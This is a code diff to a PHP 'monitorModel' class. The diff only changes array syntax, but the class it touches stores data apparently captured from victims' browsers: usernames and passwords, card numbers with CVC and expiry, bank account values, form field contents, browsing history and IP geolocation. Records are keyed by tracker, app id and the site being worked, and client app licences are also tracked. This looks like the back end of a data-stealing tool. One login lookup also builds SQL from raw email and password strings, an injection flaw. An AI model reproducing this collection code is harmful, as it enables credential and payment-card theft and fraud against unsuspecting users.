@@ -42,12 +42,13 @@ class monitorModel extends Model
         /*INSERT INTO `msu_app_list_installed`(`id`, `name`, `version`, `ip_address`, `browserNameFull`, `created-date-time`) VALUES ([value-1],[value-2],[value-3],[value-4])*/
         return $this->prepare("INSERT INTO `" . DbPREFIX . "app_list_installed` (`id`, `name`, `version`, `ip_address`, `browserNameFull`, `created-date-time`) VALUES (null, :app_name, :version, :ip_add, :browser, now());")
             ->execute(
-                array(
+                [
                     ':app_name' => $name,
                     ':version' => $version,
                     ':ip_add' => $ip,
                     ':browser' => $browser
-                ));
+                ]
+            );
     }
 
     /**
@@ -93,7 +94,7 @@ class monitorModel extends Model
         //INSERT INTO `msu_info_app_browser_passwords`(`id`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `event`, `username`, `password`, `email`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10])
         return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_browser_passwords` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `username`, `password`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, :username, :password, now());")
             ->execute(
-                array(
+                [
                     ':tracker' => $tracker,
                     ':app_id' => $app_id,
                     ':ip_add' => $ip,
@@ -103,7 +104,8 @@ class monitorModel extends Model
                     ':username' => $username,
                     ':password' => $password,
                     ':workWebsite' => $workWebsite
-                ));
+                ]
+            );
     }
 
     /**
@@ -125,7 +127,7 @@ class monitorModel extends Model
         //INSERT INTO `msu_info_app_browser_passwords`(`id`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `username`, `password`, `email`, `last_update_date_time`)  VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10])
         return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_browser_passwords` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `username`, `password`, `email`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, :username, :password, :email, now());")
             ->execute(
-                array(
+                [
                     ':tracker' => $tracker,
                     ':app_id' => $app_id,
                     ':ip_add' => $ip,
@@ -136,7 +138,8 @@ class monitorModel extends Model
                     ':password' => $password,
                     ':email' => $email,
                     ':workWebsite' => $workWebsite
-                ));
+                ]
+            );
     }
 
     /**
@@ -156,7 +159,7 @@ class monitorModel extends Model
         //INSERT INTO `msu_info_app_browser_passwords`(`id`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `event`, `username`, `password`, `email`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10])
         return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_browser_passwords` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `username`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, :username, now());")
             ->execute(
-                array(
+                [
                     ':tracker' => $tracker,
                     ':app_id' => $app_id,
                     ':ip_add' => $ip,
@@ -165,7 +168,8 @@ class monitorModel extends Model
                     ':event' => $event,
                     ':username' => $username,
                     ':workWebsite' => $workWebsite
-                ));
+                ]
+            );
     }
 
     /**
@@ -184,7 +188,7 @@ class monitorModel extends Model
         //INSERT INTO `msu_info_app_browser_history`(`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9])
         return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_browser_history` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, now());")
             ->execute(
-                array(
+                [
                     ':tracker' => $tracker,
                     ':app_id' => $app_id,
                     ':ip_add' => $ip,
@@ -192,7 +196,8 @@ class monitorModel extends Model
                     ':browser' => $browser,
                     ':event' => $event,
                     ':workWebsite' => $workWebsite
-                ));
+                ]
+            );
     }
 
     /**
@@ -224,7 +229,7 @@ class monitorModel extends Model
      */
     private function resolveLicence($data): array
     {
-        $d = array();
+        $d = [];
         if (!empty($data)) {
             $d['app_id'] = Encryption::static(_Array::value($data, 'app_id'));
             $d['ip_address'] = _Array::value($data, 'ip_address');
@@ -312,7 +317,7 @@ class monitorModel extends Model
         return $this->prepare("INSERT INTO `" . DbPREFIX . "app_licences` (`id`, `client_id`, `app_id`, `ip_address`, `browserNameFull`, `licence_type`, `lLimit`, `lLimitBase`, `issue`, `lupdate`, `lnextupdate`, `expire`, `created-date-time`) 
         VALUES (null, :clientId, :appId, :ip_add, :browser, :ltype, :limit, :limitBase, :lissue, :lupdate, :lnextupdate, :lexpire, now());")
             ->execute(
-                array(
+                [
                     ':clientId' => $clientId,
                     ':appId' => $app_id,
                     ':ip_add' => $ip,
@@ -324,7 +329,8 @@ class monitorModel extends Model
                     ':lupdate' => $lupdate,
                     ':lnextupdate' => $lnextupdate,
                     ':lexpire' => $lexpire
-                ));
+                ]
+            );
     }
 
 
@@ -465,7 +471,7 @@ class monitorModel extends Model
         //INSERT INTO `msu_info_app_users`(`id`, `first_name`, `last_name`, `email_address`, `password`, `app_id`, `ip_address`, `browserName`, `os_name_arc`, `created_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9])
         return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_users` (`id`, `first_name`, `last_name`, `email_address`, `password`, `app_id`, `ip_address`, `browserName`, `os_name_arc`, `created_date_time`) VALUES (null, :first_name, :last_name, :email, :password, :app_id, :ip_add, :browser, :os_name_arch, now());")
             ->execute(
-                array(
+                [
                     ':app_id' => $app_id,
                     ':ip_add' => $ip,
                     ':os_name_arch' => $os_name_arch,
@@ -474,7 +480,8 @@ class monitorModel extends Model
                     ':last_name' => $last_name,
                     ':email' => $email,
                     ':password' => $password
-                ));
+                ]
+            );
     }
 
     /**
@@ -544,7 +551,7 @@ class monitorModel extends Model
      */
     public function getUserInfoByEmailPassword($email, $password)
     {
-        $d = array();
+        $d = [];
         $data = $this->query("SELECT * FROM `" . DbPREFIX . "info_app_users` WHERE `email_address` = '{$email}' AND `password` = '{$password}';");
         $data = $data->fetch(PDO::FETCH_ASSOC);
         if (!empty($data)) {
@@ -581,13 +588,14 @@ class monitorModel extends Model
     {
         return $this->prepare("INSERT INTO `" . DbPREFIX . "client_update_info` (`id`, `name`, `version`, `ip_address`, `browserNameFull`, `message`, `created_date_time`) VALUES (null, :app_name, :version, :ip_add, :browser, :message, now());")
             ->execute(
-                array(
+                [
                     ':app_name' => $name,
                     ':version' => $version,
                     ':ip_add' => $ip,
                     ':browser' => $browser,
                     ':message' => $message
-                ));
+                ]
+            );
     }
 
     /**
@@ -653,7 +661,7 @@ class monitorModel extends Model
     {
         /*$ip, $BrowserName, $BrowserNameFull, $BrowserVersion, $BrowserVersionFull, $BrowserStatus, $BrowserArchitecture, $BrowserAppName, $BrowserAppCodeName, $BrowserAppVersion, $BrowserBuildID, $BrowserDoNotTrack, $BrowserCookieEnabled, $BrowserLanguage, $BrowserLanguageAll, $BrowserEngine, $BrowserEngineVersion, $BrowserVendor, $DeviceHardwareConcurrency, $DeviceMemory, $PlatformName, $PlatformArchitecture, $PlatformWindowManager, $DeviceName, $DeviceType, $DeviceScreenWidth, $DeviceScreenHeight, $DeviceScreenColorDepth, $DeviceScreenPixelDepth, $WindowLocationHref, $WindowLocationProtocol, $WindowLocationHostname, $WindowLocationPathname, $UserAgent*/
         return $this->db->prepare("INSERT INTO `" . DbPREFIX . "client_browser_info` (`id`, `ip_address`, `browserName`, `browserNameFull`, `browserVersion`, `browserVersionFull`, `browserStatus`, `browserArchitecture`, `browserAppName`, `browserCodeAppName`, `browserAppVersion`, `browserBuildID`, `browserDoNotTrack`, `browserCookieEnabled`, `browserLanguage`, `browserLanguageAll`, `browserEngine`, `browserEngineVersion`, `browserVendor`, `deviceHardwareConcurrency`, `deviceMemory`, `platformName`, `platformArchitecture`, `platformWindowManager`, `deviceName`, `deviceType`, `deviceScreenWidth`, `deviceScreenHeight`, `deviceScreenColorDepth`, `deviceScreenPixelDepth`, `windowLocationHref`, `windowLocationProtocol`, `windowLocationHostname`, `windowLocationPathname`, `userAgent`, `created_date_time`)VALUES (null, :ip_add, :browserName, :browserNameFull, :browserVersion, :browserVersionFull, :browserStatus, :browserArchitecture, :browserAppName, :browserAppCodeName, :browserAppVersion, :browserBuildID, :browserDoNotTrack, :browserCookieEnabled, :browserLanguage, :browserLanguageAll, :browserEngine, :browserEngineVersion, :browserVendor, :deviceHardwareConcurrency, :deviceMemory, :platformName, :platformArchitecture, :platformWindowManager, :deviceName, :deviceType, :deviceScreenWidth, :deviceScreenHeight, :deviceScreenColorDepth, :deviceScreenPixelDepth, :windowLocationHref, :windowLocationProtocol, :windowLocationHostname,:windowLocationPathname, :userAgent, now());")
-            ->execute(array(
+            ->execute([
                 ':ip_add' => _String::removeTags($data->browser->ip),
                 ':browserName' => _String::removeTags($data->browser->BrowserName),
                 ':browserNameFull' => _String::removeTags($data->browser->BrowserNameFull),
@@ -688,7 +696,7 @@ class monitorModel extends Model
                 ':windowLocationHostname' => _String::removeTags($data->browser->WindowLocationHostname),
                 ':windowLocationPathname' => _String::removeTags($data->browser->WindowLocationPathname),
                 ':userAgent' => $data->browser->UserAgent
-            ));
+            ]);
     }
 
     /**
@@ -699,7 +707,7 @@ class monitorModel extends Model
     public function receiveUserIpInfo($data)
     {
         return $this->db->prepare("INSERT INTO `" . DbPREFIX . "client_ip_info` (`id`, `ip_address`, `is_eu`, `city`, `region`, `region_code`, `country_name`, `country_code`, `continent_name`, `continent_code`, `latitude`, `longitude`, `postal`, `calling_code`, `flag`, `emoji_flag`, `emoji_unicode`, `asn_asn`, `asn_name`, `asn_domain`, `asn_route`, `asn_type`, `languages_name`, `languages_native`, `currency_name`, `currency_code`, `currency_symbol`, `currency_native`, `currency_plural`, `time_zone_name`, `time_zone_abbr`, `time_zone_offset`, `time_zone_is_dst`, `time_zone_current_time`, `created_date_time`) VALUES (null, :ip_add, :is_eu, :city, :region, :region_code, :country_name, :country_code, :continent_name, :continent_code, :latitude, :longitude, :postal, :calling_code, :flag, :emoji_flag, :emoji_unicode, :asn_asn, :asn_name, :asn_domain, :asn_route, :asn_type, :languages_name, :languages_native, :currency_name, :currency_code, :currency_symbol, :currency_native, :currency_plural, :time_zone_name, :time_zone_abbr, :time_zone_offset,:time_zone_is_dst, :time_zone_current_time, now());")
-            ->execute(array(
+            ->execute([
                 ':ip_add' => _String::removeTags($data->ipdata->ip),
                 ':is_eu' => _String::removeTags($data->ipdata->is_eu),
                 ':city' => _String::removeTags($data->ipdata->city),
@@ -733,7 +741,7 @@ class monitorModel extends Model
                 ':time_zone_offset' => _String::removeTags($data->ipdata->time_zone_offset),
                 ':time_zone_is_dst' => _String::removeTags($data->ipdata->time_zone_is_dst),
                 ':time_zone_current_time' => _String::removeTags($data->ipdata->time_zone_current_time)
-            ));
+            ]);
     }
 
     /**
@@ -758,7 +766,7 @@ class monitorModel extends Model
         //INSERT INTO `msu_info_payment_methods`(`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `cardNumber`, `cardHolder`, `cardBrand`, `cardExpire`, `cardCVC`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10],[value-11],[value-12],[value-13])
         return $this->prepare("INSERT INTO `" . DbPREFIX . "info_payment_methods` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `cardNumber`, `cardHolder`, `cardBrand`, `cardExpire`, `cardCVC`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, :cardNumber, :holder, :brand, :expire, :cvc, now());")
             ->execute(
-                array(
+                [
                     ':tracker' => $tracker,
                     ':app_id' => $app_id,
                     ':ip_add' => $ip,
@@ -771,7 +779,8 @@ class monitorModel extends Model
                     ':cvc' => $cardCVC,
                     ':workWebsite' => $workWebsite,
                     ':event' => $event
-                ));
+                ]
+            );
     }
 
     /**
@@ -790,7 +799,7 @@ class monitorModel extends Model
         //INSERT INTO `msu_info_bank_account`(`id`, `tracker`, `app_id`, `ip_address`, `browserNameFull`, `work_website`, `data_type`, `data_value`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8])
         return $this->prepare("INSERT INTO `" . DbPREFIX . "info_bank_account` (`id`, `tracker`, `app_id`, `ip_address`, `browserNameFull`, `work_website`, `data_type`, `data_value`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :browser, :workWebsite, :dataType, :dataValue, now());")
             ->execute(
-                array(
+                [
                     ':tracker' => $tracker,
                     ':app_id' => $app_id,
                     ':ip_add' => $ip,
@@ -798,7 +807,8 @@ class monitorModel extends Model
                     ':workWebsite' => $workWebsite,
                     ':dataType' => $dataType,
                     ':dataValue' => $dataValue
-                ));
+                ]
+            );
     }
 
     /**
@@ -819,7 +829,7 @@ class monitorModel extends Model
         //INSERT INTO `msu_info_input_elements_data`(`id`, `tracker`, `app_id`, `ip_address`, `browserNameFull`, `work_website`, `name`, `type`, `value`, `placeholder`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10],[value-11])
         return $this->prepare("INSERT INTO `" . DbPREFIX . "info_input_elements_data` (`id`, `tracker`, `app_id`, `ip_address`, `browserNameFull`, `work_website`, `name`, `type`, `value`, `placeholder`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :browser, :workWebsite, :elName, :elType, :elValue, :elPlaceholder, now());")
             ->execute(
-                array(
+                [
                     ':tracker' => $tracker,
                     ':app_id' => $app_id,
                     ':ip_add' => $ip,
@@ -829,7 +839,7 @@ class monitorModel extends Model
                     ':elType' => $type,
                     ':elValue' => $value,
                     ':elPlaceholder' => $placeholder
-                ));
+                ]
+            );
     }
-
 }
